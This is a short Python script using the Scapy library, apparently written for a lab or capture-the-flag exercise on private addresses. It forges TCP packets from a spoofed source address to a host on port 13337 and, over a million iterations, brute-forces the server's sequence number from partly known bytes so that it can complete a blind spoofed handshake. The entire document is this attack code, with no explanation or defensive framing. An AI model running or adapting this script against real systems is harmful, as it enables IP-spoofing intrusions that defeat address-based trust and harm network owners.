from scapy.all import *
import time
import random
payload = Raw('172.16.44.5')
fake = '10.2.4.10'
my = '172.16.44.5'
ip = IP(src = fake,dst = '172.16.44.1')


s1 = 'a7'
s2 = '5f'
s3 = 'a3'


list = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
for i in range(1000000):    
    SYN1 = TCP(dport = 13337,sport =1024, flags = "S",seq = 1234)
    SYNACK = send(ip/SYN1/payload)

    r1= random.randint(0,15)
    r2 = random.randint(0,15)
    s4 = str(list[r1])+str(list[r2])
    data = [s1,s2,s3,s4]
    random.shuffle(data)
    s_16 = data[0]+data[1]+data[2]+data[3]
    print(s_16)
    ack_num = int(s_16 ,16)+1
    #print(s_16,hex(ack_num-1))
    ACK = TCP(flags = 'A',seq = 1235, ack = ack_num ,dport = 13337,sport=1024 )
    send(ip/ACK/payload)










